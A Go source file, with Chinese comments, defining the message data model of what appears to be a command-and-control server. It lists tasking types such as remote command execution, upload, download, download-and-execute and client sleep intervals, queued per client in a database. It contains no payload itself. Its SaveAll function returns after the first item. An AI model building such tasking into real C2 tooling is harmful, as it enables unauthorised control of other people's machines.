package model

import (
	"encoding/json"
	"github.com/titan/tingchao/ccserver/common"
	"log"
)

const (
	MsgCC          uint8 = 101 // 命令执行
	MsgUpdate      uint8 = 102 // 更新
	MsgReg         uint8 = 104 // 客户端注册
	MsgCloseClient uint8 = 105 // 关闭客户端client程序
	MsgUpload      uint8 = 106 // 上传
	MsgSleep       uint8 = 107 // 设置休息时间
	MsgDownload    uint8 = 108 // 下载文件
	MsgDownloadRun uint8 = 109 // 下载并执行
	MsgPullMessage uint8 = 110 // 客户端拉取消息
)

const (
	MsgStateInit uint8 = 0 // 命令未执行
	MsgStateOk   uint8 = 1 // 命令执行成功
	MsgStateLose uint8 = 2 // 命令执行失败
	MsgDataNo    uint8 = 3 // 没有data数据
)

var MessageModelDao *MessageModel

func init() {
	MessageModelDao = newMessageModelDao()
}

// MessageModel 消息模块
type MessageModel struct {
	Id       string `gorm:"column:id;primary_key;type:varchar(36)" json:"Id"`  // id
	ClientId string `gorm:"column:client_id;type:varchar(36)" json:"ClientId"` // 客户端id
	MsgID    uint8  `gorm:"column:msg_id;type:int" json:"MsgID"`               // 消息ID
	Data     string `gorm:"column:data;type:longtext" json:"Data"`             // 与消息ID对应的model
	Time     int64  `gorm:"column:time;type:bigint" json:"Time"`               // 时间
	State    uint8  `gorm:"column:state;type:int" json:"State"`                // 执行状态 0:未执行 1:执行完成 2:失败
}

// TableName 设置表名
func (m MessageModel) TableName() string {
	return "message"
}

// NewMessageModel 创建一个新的消息对象
func NewMessageModel() *MessageModel {
	mm := &MessageModel{}
	return mm
}

// NewMessageModelDao 创建一个新的消息对象
func newMessageModelDao() *MessageModel {
	mm := &MessageModel{}
	return mm
}

// NewMessageModel1 创建一个新的消息对象
func NewMessageModel1(msgID uint8, data string) *MessageModel {
	mm := &MessageModel{
		MsgID: msgID,
		Data:  data,
	}
	return mm
}

func (m MessageModel) String() string {
	str, err := json.Marshal(m)
	if err != nil {
		log.Println(err)
	}
	return string(str)
}

func (m MessageModel) FindAll() ([]MessageModel, error) {
	var mm []MessageModel
	err := common.Db.Table(m.TableName()).Find(&mm).Error
	return mm, err
}

// FindByID 查找待执行待消息对象
func (m MessageModel) FindByID(id string) ([]MessageModel, error) {
	var mm []MessageModel
	err := common.Db.Table(m.TableName()).Where("client_id=? and state = 0", id).Find(&mm).Error
	return mm, err
}

func (m MessageModel) AddOne(mm MessageModel) error {
	err := common.Db.Create(mm).Error
	return err
}

func (m MessageModel) Save(mm MessageModel) error {
	err := common.Db.Table(m.TableName()).Save(mm).Error
	return err
}

func (m MessageModel) SaveAll(mm []MessageModel) error {
	for _, msg := range mm {
		err := common.Db.Table(m.TableName()).Save(msg).Error
		return err
	}
	return nil
}
